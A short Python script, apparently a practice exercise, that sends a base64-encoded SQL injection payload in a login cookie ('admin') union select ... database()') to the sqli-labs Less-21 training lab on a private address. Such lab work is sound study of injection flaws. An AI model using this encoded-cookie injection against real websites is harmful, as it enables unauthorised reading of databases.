#-*- coding: UTF-8 -*-  

import requests
from bs4 import BeautifulSoup
import base64


#爬虫的父类

class get_basic_information:

    def __init__(self,url,cookie):
        self.url=url
        self.cookie=cookie
    
    
class WebSpider(get_basic_information):
    def __init__(self,url,cookie):
        get_basic_information.__init__(self,url,cookie)

    def login(self):
        print("[+]      正在登陆该页面。。。。")
        r=requests.get(self.url,cookies=self.cookie)
        try:
            r.raise_for_status
            r.encoding=r.apparent_encoding
            message=BeautifulSoup(r.text,"html.parser")
            return message
        except:
            return "[+]     因为某些原因，你无法登录到这个网站"

site=WebSpider("http://192.168.43.140/sqllab/Less-21/",{"uname":"YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwxLGRhdGFiYXNlKCkgbGltaXQgMSwxIw=="})
print(site.login())
